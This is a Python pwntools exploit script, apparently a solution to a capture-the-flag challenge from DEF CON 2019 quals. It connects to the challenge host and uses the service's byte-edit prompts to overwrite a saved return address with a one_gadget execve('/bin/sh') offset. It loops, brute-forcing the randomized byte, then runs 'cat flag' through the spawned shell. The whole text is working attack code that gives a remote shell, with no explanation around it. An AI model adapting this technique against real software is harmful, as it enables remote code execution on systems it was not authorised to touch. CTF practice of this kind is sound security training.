from pwn import *

conn = remote("speedrun-007.quals2019.oooverflow.io", 31337)

def trigger_fsb(payload):
	conn.recvuntil("What do you have this time")
	conn.send(payload)
i=0
while(True):
	trigger_fsb("A")

	# rbp + 0x238 => <__libc_start_main+231>
	# rbp -0x400 +0x638
	# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
	# constraints:
	# [rsp+0x40] == NULL
	# 0x7ffff7a33322 

	conn.recvuntil("Changes you'd like to make (y/n)?")
	conn.send("y")
	conn.send(p16(0x638))
	conn.send(p8(0x22))

	conn.recvuntil("Changes you'd like to make (y/n)?")
	conn.send("y")
	conn.send(p16(0x638+1))
	conn.send(p8(0x33))

	conn.recvuntil("Changes you'd like to make (y/n)?")
	conn.send("y")
	conn.send(p16(0x638+2))
	conn.send(p8(0xa3))

	conn.recvuntil("Changes you'd like to make (y/n)?")
	conn.send("n")
	
	conn.recvuntil("L8R.\n")
	try:
		conn.sendline('cat flag;exit')
		result = conn.recvall(timeout=2)
		print(result)
		if "OOO{" in result:
			print("Found it on try %s" % i)
			print(result)
			break
		else:
			print("try %s failed" % i)
		
	except:
		i += 1
		continue
	conn.close()
	conn = remote("speedrun-007.quals2019.oooverflow.io", 31337)
	i += 1
